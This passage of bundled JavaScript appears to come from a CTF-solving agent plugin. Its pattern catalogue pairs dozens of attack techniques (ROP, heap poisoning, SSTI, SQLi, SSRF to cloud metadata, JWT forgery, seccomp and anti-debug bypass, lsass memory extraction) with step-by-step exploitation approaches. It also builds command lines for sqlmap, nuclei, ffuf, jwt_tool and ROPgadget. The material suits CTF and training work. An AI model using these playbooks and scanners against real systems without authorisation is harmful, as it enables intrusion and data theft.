  }
  return { ok: false, reason: "unexpected lsp response" };
}
function createLspTools(params) {
  const directory = params.projectDir;
  return {
    ctf_lsp_goto_definition: tool({
      description: "LSP: go to definition",
      args: {
        filePath: schema2.string().min(1),
        line: schema2.number().int().min(1),
        character: schema2.number().int().min(0)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "goToDefinition", directory, {
          filePath: args.filePath,
          line: args.line,
          character: args.character
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_lsp_find_references: tool({
      description: "LSP: find references",
      args: {
        filePath: schema2.string().min(1),
        line: schema2.number().int().min(1),
        character: schema2.number().int().min(0),
        includeDeclaration: schema2.boolean().optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "findReferences", directory, {
          filePath: args.filePath,
          line: args.line,
          character: args.character,
          includeDeclaration: args.includeDeclaration
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_lsp_diagnostics: tool({
      description: "LSP: diagnostics for a file",
      args: {
        filePath: schema2.string().min(1)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "diagnostics", directory, {
          filePath: args.filePath
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    })
  };
}

// src/orchestration/pattern-matcher.ts
var KNOWN_PATTERNS = [
  {
    patternId: "buffer-overflow-basic",
    patternName: "Basic Stack Buffer Overflow",
    confidence: "high",
    targetType: "PWN",
    description: "Fixed-size stack buffer with controllable overwrite and likely RIP/EIP control.",
    suggestedApproach: "Find exact offset with cyclic pattern, check mitigations (NX/PIE/canary), then pivot to ret2win/ret2libc/ROP based on protections.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["buffer overflow", "gets", "strcpy", "stack smash", "rip control", "eip", "overflow"]
  },
  {
    patternId: "format-string-leak",
    patternName: "Format String Leak/Write",
    confidence: "high",
    targetType: "PWN",
    description: "User input reaches printf-like sink without format control sanitization.",
    suggestedApproach: "Probe with %p/%x to leak stack/libc, determine argument index, then use %n for targeted writes if needed.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["format string", "printf", "%p", "%n", "%x", "vfprintf", "user controlled format"]
  },
  {
    patternId: "heap-tcache-poison",
    patternName: "Heap Tcache Poisoning",
    confidence: "high",
    targetType: "PWN",
    description: "Tcache freelist manipulation enables arbitrary chunk return.",
    suggestedApproach: "Check glibc version, leak heap/libc pointers, poison tcache next pointer, then allocate to overwrite hook/vtable target.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["tcache", "double free", "free list", "heap chunk", "glibc 2.27", "poison", "malloc"]
  },
  {
    patternId: "heap-uaf",
    patternName: "Heap Use-After-Free",
    confidence: "high",
    targetType: "PWN",
    description: "Freed chunk remains reachable through stale pointer path.",
    suggestedApproach: "Map object lifecycle, reclaim freed chunk with controlled data, then hijack function pointer/vtable or metadata for code execution.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["use after free", "uaf", "dangling pointer", "free then use", "heap object", "stale reference"]
  },
  {
    patternId: "ret2libc",
    patternName: "ret2libc",
    confidence: "high",
    targetType: "PWN",
    description: "Control flow hijack with NX enabled and libc symbols available via leak.",
    suggestedApproach: "Leak libc function address, compute libc base, resolve system and /bin/sh, then craft aligned ROP call chain.",
    suggestedTemplate: "ret2libc-outline",
    keywords: ["ret2libc", "libc leak", "got leak", "plt", "system", "/bin/sh", "nx enabled"]
  },
  {
    patternId: "rop-chain",
    patternName: "ROP Chain Construction",
    confidence: "high",
    targetType: "PWN",
    description: "No direct shellcode execution; chain gadgets to call useful functions/syscalls.",
    suggestedApproach: "Collect gadgets for argument registers and stack alignment, then chain leak stage and execution stage with deterministic constraints.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["rop", "gadget", "pop rdi", "ret gadget", "chain", "nx", "return oriented"]
  },
  {
    patternId: "srop",
    patternName: "Sigreturn-Oriented Programming",
    confidence: "medium",
    targetType: "PWN",
    description: "Signal frame forgery to control syscall context in limited gadget scenarios.",
    suggestedApproach: "Find syscall and sigreturn trigger, forge rt_sigreturn frame on stack, then set registers for execve/mprotect flow.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["srop", "sigreturn", "rt_sigreturn", "syscall; ret", "ucontext", "frame forgery"]
  },
  {
    patternId: "ret2dlresolve",
    patternName: "ret2dlresolve",
    confidence: "medium",
    targetType: "PWN",
    description: "Dynamic linker abuse to resolve symbols at runtime without direct libc leak.",
    suggestedApproach: "Craft fake relocation/symbol structures on writable memory, invoke plt resolver entry, resolve system and execute payload.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["ret2dlresolve", "dl-resolve", "linker", "plt0", "reloc", "dynsym", "dynstr"]
  },
  {
    patternId: "seccomp-bypass",
    patternName: "Seccomp Filter Bypass",
    confidence: "medium",
    targetType: "PWN",
    description: "Restricted syscalls require alternative primitives to get execution impact.",
    suggestedApproach: "Recover seccomp policy, choose allowed syscalls, then pivot to open/read/write or ORW-style chain instead of blocked execve.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["seccomp", "prctl", "sandbox", "syscall filter", "orw", "bpf"]
  },
  {
    patternId: "stack-pivot",
    patternName: "Stack Pivot",
    confidence: "medium",
    targetType: "PWN",
    description: "Limited overflow but controllable pointer allows moving stack to larger controlled region.",
    suggestedApproach: "Locate pivot gadget (leave; ret/xchg rsp), stage second ROP chain in writable buffer, then pivot and execute full chain.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["stack pivot", "leave; ret", "xchg rsp", "fake stack", "pivot", "bss chain"]
  },
  {
    patternId: "off-by-one",
    patternName: "Off-by-One Overflow",
    confidence: "medium",
    targetType: "PWN",
    description: "Single-byte overwrite corrupts metadata/size or saved frame state.",
    suggestedApproach: "Model exact boundary condition, target size byte/prev_inuse/canary LSB, and chain into controlled allocation or return path.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["off by one", "null byte overflow", "size byte", "prev_inuse", "one byte overwrite", "boundary"]
  },
  {
    patternId: "ssti-jinja2",
    patternName: "SSTI in Jinja2",
    confidence: "high",
    targetType: "WEB_API",
    description: "Template expression input is rendered directly by Jinja2/Flask.",
    suggestedApproach: "Confirm expression evaluation with arithmetic payload, enumerate object graph safely, then escalate to file read/command execution proof.",
    keywords: ["ssti", "jinja2", "{{7*7}}", "render_template_string", "template injection", "flask"]
  },
  {
    patternId: "sqli-union",
    patternName: "Union-Based SQLi",
    confidence: "high",
    targetType: "WEB_API",
    description: "Query composition allows UNION SELECT data extraction.",
    suggestedApproach: "Identify injectable parameter, align column count/types, then extract schema and sensitive fields with minimal-impact payloads.",
    keywords: ["union select", "sql injection", "order by", "database error", "mysql", "postgres", "sqlite"]
  },
  {
    patternId: "sqli-blind",
    patternName: "Blind SQLi",
    confidence: "high",
    targetType: "WEB_API",
    description: "No direct SQL output but boolean/time side-channel present.",
    suggestedApproach: "Build deterministic boolean or time-based probes, then extract target data bitwise/charwise with retry and jitter control.",
    keywords: ["blind sqli", "time based", "sleep(", "boolean based", "if(", "pg_sleep", "benchmark("]
  },
  {
    patternId: "ssrf-basic",
    patternName: "SSRF",
    confidence: "high",
    targetType: "WEB_API",
    description: "Server fetches attacker-controlled URL and can reach internal resources.",
    suggestedApproach: "Validate outbound fetch, test localhost/metadata/internal hosts with safe probes, then demonstrate controlled internal access impact.",
    keywords: ["ssrf", "url fetch", "metadata", "169.254.169.254", "internal host", "webhook", "proxy"]
  },
  {
    patternId: "jwt-forgery",
    patternName: "JWT Forgery/Confusion",
    confidence: "high",
    targetType: "WEB_API",
    description: "JWT verification weakness (alg confusion/weak secret/kid abuse).",
    suggestedApproach: "Inspect token header/alg behavior, test none/HS-RS confusion where applicable, then prove privilege change with signed forgery.",
    keywords: ["jwt", "alg none", "hs256", "rs256", "kid", "jwk", "token forgery"]
  },
  {
    patternId: "deserialization",
    patternName: "Unsafe Deserialization",
    confidence: "medium",
    targetType: "WEB_API",
    description: "Untrusted serialized input reaches dangerous object constructors/gadgets.",
    suggestedApproach: "Identify serialization format and sink, craft minimal gadget payload for controlled side effect, then escalate impact carefully.",
    keywords: ["deserialization", "pickle", "java serialization", "ysoserial", "objectinputstream", "gadget chain"]
  },
  {
    patternId: "lfi-rfi",
    patternName: "LFI/RFI",
    confidence: "high",
    targetType: "WEB_API",
    description: "File include/read path is controllable and escapes intended directory.",
    suggestedApproach: "Probe traversal normalization, read benign target first, then prove sensitive file exposure or inclusion impact.",
    keywords: ["lfi", "rfi", "path traversal", "../", "php://filter", "include", "file read"]
  },
  {
    patternId: "xxe-injection",
    patternName: "XXE Injection",
    confidence: "medium",
    targetType: "WEB_API",
    description: "XML parser allows external entity expansion.",
    suggestedApproach: "Confirm external entity resolution with harmless entity, then demonstrate file read or SSRF through controlled DTD payload.",
    keywords: ["xxe", "doctype", "xml parser", "external entity", "dtd", "sax", "dom4j"]
  },
  {
    patternId: "race-condition",
    patternName: "Race Condition",
    confidence: "medium",
    targetType: "WEB_API",
    description: "Concurrent requests bypass state checks or consume shared resources unsafely.",
    suggestedApproach: "Locate check/use boundary, send synchronized concurrent requests, and verify inconsistent final state as reproducible impact.",
    keywords: ["race condition", "toctou", "concurrent request", "double spend", "parallel", "non-atomic"]
  },
  {
    patternId: "prototype-pollution",
    patternName: "Prototype Pollution",
    confidence: "medium",
    targetType: "WEB_API",
    description: "JavaScript object merge/path-set lets attacker control prototype properties.",
    suggestedApproach: "Test __proto__/constructor.prototype write paths, confirm polluted property propagation, then prove privilege/logic impact.",
    keywords: ["prototype pollution", "__proto__", "constructor.prototype", "lodash merge", "node", "polluted"]
  },
  {
    patternId: "web3-reentrancy",
    patternName: "WEB3 Reentrancy",
    confidence: "high",
    targetType: "WEB3",
    description: "State is updated after external call, allowing callback re-entry.",
    suggestedApproach: "Map call graph and storage writes, implement minimal attacker callback, then prove invariant break with deterministic tx sequence.",
    suggestedTemplate: "web3-reentrancy-checklist",
    keywords: ["reentrancy", "call.value", "external call", "fallback", "receive", "checks-effects-interactions"]
  },
  {
    patternId: "web3-access-control",
    patternName: "WEB3 Access Control Bypass",
    confidence: "high",
    targetType: "WEB3",
    description: "Privileged functions lack robust role/ownership validation.",
    suggestedApproach: "Trace modifier and role checks, test alternate code paths (proxy/delegatecall/init), then demonstrate unauthorized state change.",
    keywords: ["onlyowner", "access control", "role", "auth bypass", "delegatecall", "initializer"]
  },
  {
    patternId: "web3-oracle-manipulation",
    patternName: "WEB3 Oracle Manipulation",
    confidence: "high",
    targetType: "WEB3",
    description: "Protocol depends on manipulable price/feed source.",
    suggestedApproach: "Measure liquidity/cadence assumptions, simulate adverse price update, then verify liquidation/mint/burn math impact.",
    suggestedTemplate: "web3-oracle-manipulation",
    keywords: ["oracle", "twap", "price feed", "manipulation", "uniswap", "liquidation"]
  },
  {
    patternId: "web3-signature-replay",
    patternName: "WEB3 Signature Replay/Domain Confusion",
    confidence: "medium",
    targetType: "WEB3",
    description: "Signature validation omits nonce/chain/domain constraints.",
    suggestedApproach: "Inspect signed struct fields and domain separator usage, then test replay across chains/contracts/nonces.",
    keywords: ["eip712", "signature replay", "nonce", "domain separator", "permit", "chainid"]
  },
  {
    patternId: "web3-storage-collision",
    patternName: "WEB3 Proxy Storage Collision",
    confidence: "medium",
    targetType: "WEB3",
    description: "Proxy/implementation storage layout mismatch corrupts critical slots.",
    suggestedApproach: "Compare slot layouts across upgrades, locate overlapping admin/logic state, and prove controlled overwrite path.",
    keywords: ["proxy", "storage collision", "upgradeable", "uups", "transparent proxy", "slot"]
  },
  {
    patternId: "web3-flashloan-economics",
    patternName: "WEB3 Flashloan Economic Attack",
    confidence: "medium",
    targetType: "WEB3",
    description: "Protocol assumptions break under atomic large-capital manipulation.",
    suggestedApproach: "Model transaction atomicity and state checkpoints, simulate flashloan path, and compute profitability/feasibility bounds.",
    keywords: ["flashloan", "economic attack", "atomic", "defi", "sandwich", "price impact"]
  },
  {
    patternId: "misc-osint-pivot",
    patternName: "MISC OSINT Pivot",
    confidence: "medium",
    targetType: "MISC",
    description: "Challenge solution requires correlating weak public signals into a high-confidence lead.",
    suggestedApproach: "Collect source-cited clues, build timeline/entity map, and disconfirm top hypothesis before deep branching.",
    suggestedTemplate: "misc-osint-evidence-loop",
    keywords: ["osint", "timeline", "username pivot", "archive", "metadata", "citation"]
  },
  {
    patternId: "misc-encoding-chain",
    patternName: "MISC Multi-Stage Encoding",
    confidence: "medium",
    targetType: "MISC",
    description: "Artifact uses layered encodings/compressions causing misleading partial outputs.",
    suggestedApproach: "Detect encode/decode layers iteratively, validate each layer checksum/structure, and avoid lossy transforms.",
    keywords: ["base64", "hex", "rot", "gzip", "xor", "multi-stage"]
  },
  {
    patternId: "misc-logic-constraint",
    patternName: "MISC Logic/Constraint Puzzle",
    confidence: "medium",
    targetType: "MISC",
    description: "Puzzle is solvable via explicit constraints rather than brute-force search.",
    suggestedApproach: "Formalize rules as constraints, solve with SAT/SMT or guided search, and verify solution against original checker.",
    keywords: ["logic puzzle", "constraint", "sat", "smt", "state search", "invariant"]
  },
  {
    patternId: "rsa-small-e",
    patternName: "RSA Small Exponent",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Low exponent with weak padding/no padding enables direct root or broadcast attacks.",
    suggestedApproach: "Check padding mode and message bounds, then apply integer root or Hastad-style recovery with verifiable small test vectors.",
    keywords: ["rsa", "small e", "e=3", "hastad", "no padding", "integer root", "broadcast"]
  },
  {
    patternId: "rsa-common-modulus",
    patternName: "RSA Common Modulus",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Same modulus reused with different coprime exponents.",
    suggestedApproach: "Verify same N and gcd(e1,e2)=1, apply extended Euclid on exponents, combine ciphertext powers to recover plaintext.",
    keywords: ["common modulus", "same n", "rsa", "extended euclid", "coprime exponents", "bezout"]
  },
  {
    patternId: "rsa-wiener",
    patternName: "RSA Wiener Attack",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Private exponent d too small and recoverable via continued fractions.",
    suggestedApproach: "Test Wiener conditions quickly, run continued fraction convergents, then verify recovered key by encryption/decryption round trip.",
    keywords: ["wiener", "continued fraction", "small d", "rsa weak key", "convergent", "private exponent"]
  },
  {
    patternId: "aes-ecb-oracle",
    patternName: "AES ECB Oracle",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Deterministic ECB encryption oracle leaks plaintext structure/bytes.",
    suggestedApproach: "Confirm ECB block repetition, derive block size, then perform byte-at-a-time dictionary attack with alignment control.",
    suggestedTemplate: "ecb-byte-at-a-time",
    keywords: ["aes ecb", "oracle", "byte at a time", "deterministic block", "repeated blocks", "chosen plaintext"]
  },
  {
    patternId: "aes-cbc-bitflip",
    patternName: "AES CBC Bit-Flipping",
    confidence: "high",
    targetType: "CRYPTO",
    description: "CBC malleability permits controlled plaintext change without key knowledge.",
    suggestedApproach: "Locate target plaintext block, compute xor delta against previous ciphertext block, then verify privilege field flip.",
    keywords: ["cbc bitflip", "aes cbc", "malleability", "iv manipulation", "xor delta", "admin=true"]
  },
  {
    patternId: "padding-oracle",
    patternName: "CBC Padding Oracle",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Padding validity side-channel allows plaintext recovery/forgery.",
    suggestedApproach: "Stabilize oracle signal, recover plaintext bytewise from tail, then optionally forge valid ciphertext for target message.",
    suggestedTemplate: "padding-oracle-loop",
    keywords: ["padding oracle", "pkcs7", "cbc", "invalid padding", "oracle", "bytewise decryption"]
  },
  {
    patternId: "hash-length-extension",
    patternName: "Hash Length Extension",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "MAC built as hash(secret || message) on Merkle-Damgard hash is forgeable.",
    suggestedApproach: "Identify vulnerable construction and hash family, brute-force key length candidates, then append controlled suffix with valid MAC.",
    keywords: ["length extension", "sha1", "md5", "secret prefix", "merkle damgard", "mac forgery"]
  },
  {
    patternId: "discrete-log",
    patternName: "Discrete Log Weak Parameters",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Group parameters permit tractable DLP solution (small subgroup/smooth order).",
    suggestedApproach: "Factor group order where possible, use baby-step giant-step or Pohlig-Hellman, then verify secret reconstruction.",
    keywords: ["discrete log", "dh", "pohlig hellman", "baby-step giant-step", "smooth order", "small subgroup"]
  },
  {
    patternId: "xor-known-plaintext",
    patternName: "XOR Known-Plaintext",
    confidence: "high",
    targetType: "CRYPTO",
    description: "XOR keystream reused or partially known allowing key recovery.",
    suggestedApproach: "Use known plaintext crib to recover keystream segment, extend by consistency checks, and decrypt remaining ciphertext.",
    keywords: ["xor", "known plaintext", "crib", "reused key", "one time pad reuse", "keystream"]
  },
  {
    patternId: "mt19937-predict",
    patternName: "MT19937 State Prediction",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Enough PRNG outputs leak internal MT19937 state and future outputs.",
    suggestedApproach: "Collect sufficient outputs, untemper to reconstruct state, then predict future values or recover seed path.",
    keywords: ["mt19937", "mersenne twister", "untemper", "prng", "predict output", "seed recovery"]
  },
  {
    patternId: "anti-debug",
    patternName: "Anti-Debug Techniques",
    confidence: "medium",
    targetType: "REV",
    description: "Binary actively detects debugger/instrumentation to alter control flow.",
    suggestedApproach: "Identify anti-debug checks (ptrace/timing/self-check), patch or emulate bypass, then re-run with parity artifacts.",
    keywords: ["anti debug", "ptrace", "isdebuggerpresent", "timing check", "debug detect", "self check"]
  },
  {
    patternId: "vm-obfuscation",
    patternName: "VM-Based Obfuscation",
    confidence: "medium",
    targetType: "REV",
    description: "Custom bytecode VM hides core logic behind dispatcher and handlers.",
    suggestedApproach: "Locate VM loop and handler table, lift bytecode semantics, then solve/check constraints from reconstructed VM instructions.",
    keywords: ["vm", "bytecode", "dispatcher", "handler", "virtual machine", "obfuscation"]
  },
  {
    patternId: "angr-solvable",
    patternName: "Angr-Solvable Constraint Path",
    confidence: "medium",
    targetType: "REV",
    description: "Program path conditions are suitable for symbolic execution.",
    suggestedApproach: "Isolate win/lose addresses, model input bytes as symbolic vars, constrain bad paths away, and solve for accepted input.",
    keywords: ["angr", "symbolic execution", "find avoid", "path constraints", "claripy", "solve input"]
  },
  {
    patternId: "z3-constraints",
    patternName: "Z3 Constraint Solving",
    confidence: "high",
    targetType: "REV",
    description: "Validation logic is arithmetic/bitwise constraints directly translatable to SMT.",
    suggestedApproach: "Extract exact constraints from decompilation, encode as bit-vectors in z3, solve, and validate candidate on original binary.",
    keywords: ["z3", "constraints", "bit vector", "smt", "equation", "symbolic solver"]
  },
  {
    patternId: "self-modifying-code",
    patternName: "Self-Modifying Code",
    confidence: "medium",
    targetType: "REV",
    description: "Runtime code/data mutation invalidates naive static analysis assumptions.",
    suggestedApproach: "Trace runtime writes to executable/validation regions, dump post-decryption stages, and analyze stabilized code snapshot.",
    keywords: ["self modifying", "runtime patch", "unpack", "decrypt code", "jit", "write xor execute"]
  },
  {
    patternId: "steganography-lsb",
    patternName: "Steganography LSB",
    confidence: "high",
    targetType: "FORENSICS",
    description: "Payload hidden in image/audio least-significant bits or channel ordering.",
    suggestedApproach: "Inspect metadata and channels, extract LSB planes with multiple bit orders, then validate decoded payload structure.",
    keywords: ["steganography", "lsb", "steg", "png", "bitmap", "hidden message", "channels"]
  },
  {
    patternId: "pcap-extraction",
    patternName: "PCAP Stream Extraction",
    confidence: "high",
    targetType: "FORENSICS",
    description: "Key evidence/flag resides in network capture streams or transferred files.",
    suggestedApproach: "Identify suspicious protocols/hosts, reconstruct streams/files, then carve/decode transferred artifacts for final evidence.",
    keywords: ["pcap", "wireshark", "tcp stream", "http objects", "dns exfil", "packet capture"]
  },
  {
    patternId: "memory-dump",
    patternName: "Memory Dump Analysis",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Secrets/process traces recoverable from volatile memory snapshot.",
    suggestedApproach: "Profile memory image, enumerate processes/connections, extract credentials/command history/artifacts, and cross-check timeline.",
    keywords: ["memory dump", "volatility", "ram", "process list", "lsass", "mem image"]
  },
  {
    patternId: "disk-image",
    patternName: "Disk Image Timeline",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Filesystem artifacts in raw disk image reveal deleted/hidden data.",
    suggestedApproach: "Mount image read-only, inspect partitions/filesystems, recover deleted entries, and build timeline from metadata.",
    keywords: ["disk image", "forensic image", "partition", "mft", "ext4", "deleted files", "timeline"]
  },
  {
    patternId: "file-carving",
    patternName: "File Carving",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Embedded payload exists in unallocated/slack or concatenated binary blobs.",
    suggestedApproach: "Locate magic bytes and boundaries, carve candidate files, then validate headers/checksums and recurse into nested containers.",
    keywords: ["file carving", "magic bytes", "binwalk", "foremost", "slack space", "embedded file"]
  }
];
var CONFIDENCE_RANK = {
  low: 1,
  medium: 2,
  high: 3
};
function normalize2(value) {
  return value.trim().toLowerCase().replace(/\s+/g, " ");
}
function toTokenSet2(text) {
  const parts = text.split(/[^a-z0-9_+./%-]+/i).map((p) => p.trim().toLowerCase()).filter((p) => p.length > 0);
  return new Set(parts);
}
function keywordMatched(normalizedText, tokens, keyword) {
  const normalizedKeyword = normalize2(keyword);
  if (!normalizedKeyword) {
    return false;
  }
  if (normalizedKeyword.length <= 3) {
    return tokens.has(normalizedKeyword);
  }
  if (normalizedKeyword.includes(" ") || normalizedKeyword.includes("-") || normalizedKeyword.includes("/")) {
    return normalizedText.includes(normalizedKeyword);
  }
  return tokens.has(normalizedKeyword) || normalizedText.includes(normalizedKeyword);
}
function mergeConfidence(baseline, hits, totalKeywords) {
  if (totalKeywords <= 0) {
    return baseline;
  }
  const ratio = hits / totalKeywords;
  const derived = ratio >= 0.6 ? "high" : ratio >= 0.35 ? "medium" : "low";
  return CONFIDENCE_RANK[derived] > CONFIDENCE_RANK[baseline] ? derived : baseline;
}
function matchPatterns(text, targetType) {
  const normalizedText = normalize2(text ?? "");
  if (!normalizedText) {
    return [];
  }
  const tokens = toTokenSet2(normalizedText);
  const scoredMatches = KNOWN_PATTERNS.filter((pattern) => targetType ? pattern.targetType === targetType : true).map((pattern) => {
    const validKeywords = pattern.keywords.map(normalize2).filter((keyword) => keyword.length > 0);
    const hits = validKeywords.filter((keyword) => keywordMatched(normalizedText, tokens, keyword));
    const phraseHit = hits.some((keyword) => keyword.includes(" ") || keyword.includes("-") || keyword.includes("/"));
    const hitCount = hits.length;
    const ratio = validKeywords.length > 0 ? hitCount / validKeywords.length : 0;
    const shouldInclude = hitCount >= 2 || ratio >= 0.34 || phraseHit;
    if (!shouldInclude) {
      return null;
    }
    const score = hitCount * 10 + Math.round(ratio * 100);
    return {
      pattern: {
        ...pattern,
        confidence: mergeConfidence(pattern.confidence, hitCount, validKeywords.length)
      },
      score
    };
  }).filter((entry) => entry !== null);
  return scoredMatches.sort((a, b) => {
    const confDiff = CONFIDENCE_RANK[b.pattern.confidence] - CONFIDENCE_RANK[a.pattern.confidence];
    if (confDiff !== 0) {
      return confDiff;
    }
    if (b.score !== a.score) {
      return b.score - a.score;
    }
    return a.pattern.patternId.localeCompare(b.pattern.patternId);
  }).map((entry) => entry.pattern);
}
function buildPatternSummary(matches) {
  if (!matches || matches.length === 0) {
    return "No strong known CTF pattern matches found. Continue SCAN with 2-4 hypotheses and cheapest disconfirm tests.";
  }
  const lines = [
    `Known pattern matches: ${matches.length}`,
    "Use highest-confidence items first and run the cheapest disconfirm test before deep execution."
  ];
  for (const match of matches) {
    const templatePart = match.suggestedTemplate ? ` | template=${match.suggestedTemplate}` : "";
    lines.push(`- [${match.confidence}] ${match.patternName} (${match.patternId}, ${match.targetType})${templatePart}`, `  approach: ${match.suggestedApproach}`, `  keywords: ${match.keywords.join(", ")}`);
  }
  return lines.join(`
`);
}

// src/orchestration/tool-integration.ts
var DEFAULT_NUCLEI_RATE_LIMIT = 50;
var MIN_NUCLEI_RATE_LIMIT = 1;
var MAX_NUCLEI_RATE_LIMIT = 200;
var MIN_ROP_DEPTH = 1;
var MAX_ROP_DEPTH = 40;
function shellQuote2(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function clamp(value, min, max) {
  if (!Number.isFinite(value)) {
    return min;
  }
  return Math.min(max, Math.max(min, Math.trunc(value)));
}
function uniqStrings(values) {
  return Array.from(new Set(values));
}
function checksecCommand(binaryPath) {
  return {
    tool: "checksec",
    command: `checksec --file=${shellQuote2(binaryPath)}`,
    purpose: "Inspect binary hardening protections",
    outputParser: "parseChecksecOutput"
  };
}
function ropgadgetCommand(binaryPath, options) {
  const parts = ["ROPgadget", `--binary ${shellQuote2(binaryPath)}`];
  if (typeof options?.depth === "number") {
    parts.push(`--depth ${clamp(options.depth, MIN_ROP_DEPTH, MAX_ROP_DEPTH)}`);
  }
  const filter = options?.filter?.trim();
  if (filter) {
    parts.push(`--only ${shellQuote2(filter)}`);
  }
  return {
    tool: "ROPgadget",
    command: parts.join(" "),
    purpose: "Discover usable ROP gadgets",
    outputParser: "ropgadget_summary_regex"
  };
}
function oneGadgetCommand(libcPath) {
  return {
    tool: "one_gadget",
    command: `one_gadget --raw ${shellQuote2(libcPath)}`,
    purpose: "Enumerate one-shot libc gadget offsets",
    outputParser: "one_gadget_offset_regex"
  };
}
function binwalkCommand(filePath, extract = false) {
  return {
    tool: "binwalk",
    command: `binwalk${extract ? " -e" : ""} ${shellQuote2(filePath)}`,
    purpose: extract ? "Scan and extract embedded data" : "Scan for embedded file signatures",
    outputParser: "binwalk_signature_regex"
  };
}
function exiftoolCommand(filePath) {
  return {
    tool: "exiftool",
    command: `exiftool ${shellQuote2(filePath)}`,
    purpose: "Extract artifact metadata",
    outputParser: "exif_key_value_regex"
  };
}
function nucleiCommand(target, options) {
  const rateLimit = clamp(options?.rateLimit ?? DEFAULT_NUCLEI_RATE_LIMIT, MIN_NUCLEI_RATE_LIMIT, MAX_NUCLEI_RATE_LIMIT);
  const parts = [
    "nuclei",
    `-u ${shellQuote2(target)}`,
    "-silent",
    "-no-color",
    `-rate-limit ${rateLimit}`
  ];
  const templates = options?.templates?.trim();
  if (templates) {
    parts.push(`-t ${shellQuote2(templates)}`);
  }
  const severity = uniqStrings((options?.severity ?? "").split(",").map((item) => item.trim().toLowerCase()).filter((item) => /^(info|low|medium|high|critical|unknown)$/.test(item))).join(",");
  if (severity) {
    parts.push(`-severity ${shellQuote2(severity)}`);
  }
  return {
    tool: "nuclei",
    command: parts.join(" "),
    purpose: "Run template vulnerability checks with safety bounds",
    outputParser: "nuclei_finding_regex"
  };
}
function rsactftoolCommand(options) {
  const parts = ["RsaCtfTool", "--private"];
  const publicKey = options.publicKey?.trim();
  if (publicKey) {
    parts.push(`--publickey ${shellQuote2(publicKey)}`);
  } else {
    const n = options.n?.trim();
    const e = options.e?.trim();
    const c = options.c?.trim();
    if (n) {
      parts.push(`--n ${shellQuote2(n)}`);
    }
    if (e) {
      parts.push(`--e ${shellQuote2(e)}`);
    }
    if (c) {
      parts.push(`--uncipher ${shellQuote2(c)}`);
    }
  }
  if (parts.length === 2) {
    parts.push("--help");
  }
  return {
    tool: "RsaCtfTool",
    command: parts.join(" "),
    purpose: "Attempt RSA key recovery/decryption",
    outputParser: "rsactftool_key_material_regex"
  };
}
function patchelfCommand(binaryPath, libcPath, ldPath) {
  const steps = [];
  const cleanLdPath = ldPath?.trim();
  if (cleanLdPath) {
    steps.push(`patchelf --set-interpreter ${shellQuote2(cleanLdPath)} ${shellQuote2(binaryPath)}`);
  }
  steps.push(`patchelf --replace-needed libc.so.6 ${shellQuote2(libcPath)} ${shellQuote2(binaryPath)}`);
  return {
    tool: "patchelf",
    command: steps.join(" && "),
    purpose: "Patch binary to match remote libc/loader",
    outputParser: "patchelf_exit_status"
  };
}
function recommendedTools(targetType) {
  switch (targetType) {
    case "PWN":
      return [
        checksecCommand("<binary>"),
        ropgadgetCommand("<binary>", { depth: 12, filter: "pop|ret|syscall" }),
        oneGadgetCommand("<libc.so.6>"),
        patchelfCommand("<binary>", "<libc.so.6>", "<ld-linux-x86-64.so.2>")
      ];
    case "REV":
      return [checksecCommand("<binary>"), binwalkCommand("<artifact>", true), exiftoolCommand("<artifact>")];
    case "CRYPTO":
      return [
        rsactftoolCommand({ n: "<n>", e: "<e>", c: "<ciphertext>" }),
        {
          tool: "z3",
          command: "python3 solve.py",
          purpose: "Run symbolic solver constraints",
          outputParser: "z3_sat_unsat_regex"
        }
      ];
    case "WEB_API":
      return [
        nucleiCommand("<target>", { rateLimit: DEFAULT_NUCLEI_RATE_LIMIT }),
        { tool: "sqlmap", command: "sqlmap -u '<target_url>' --batch --level=2 --risk=1", purpose: "Automated SQL injection detection", outputParser: "sqlmap_result_regex" },
        { tool: "curl", command: "curl -v '<target_url>'", purpose: "Inspect HTTP headers and response", outputParser: "curl_header_regex" },
        { tool: "ffuf", command: "ffuf -u '<target_url>/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -t 10", purpose: "Content discovery with rate limiting", outputParser: "ffuf_result_regex" },
        { tool: "jwt_tool", command: "jwt_tool '<jwt_token>' -a", purpose: "JWT analysis and attack enumeration", outputParser: "jwt_tool_regex" }
      ];
    case "WEB3":
      return [
        nucleiCommand("<target>", { rateLimit: DEFAULT_NUCLEI_RATE_LIMIT }),
        { tool: "slither", command: "slither '<contract.sol>'", purpose: "Solidity static vulnerability analysis", outputParser: "slither_finding_regex" },
        { tool: "forge", command: "forge test -vvv", purpose: "Run Foundry test suite with verbose output", outputParser: "forge_test_regex" },
        { tool: "cast", command: "cast call '<contract_address>' 'balanceOf(address)' '<address>'", purpose: "Read contract state", outputParser: "cast_output_regex" }
      ];
    case "FORENSICS":
      return [
        binwalkCommand("<image_or_dump>", true),
        exiftoolCommand("<image_or_media>"),
